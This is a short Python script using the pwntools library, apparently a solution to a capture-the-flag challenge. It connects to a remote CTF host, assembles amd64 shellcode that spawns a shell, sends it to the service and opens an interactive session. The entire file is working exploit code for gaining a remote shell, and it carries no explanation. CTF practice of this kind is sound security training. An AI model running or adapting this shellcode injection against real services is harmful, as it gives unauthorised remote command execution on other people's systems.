from pwn import *

context.arch = 'amd64'

target = remote("pwn.ctf.secso.cc", 5001)

buf = asm(shellcraft.amd64.sh())

target.sendline(buf)
target.interactive()
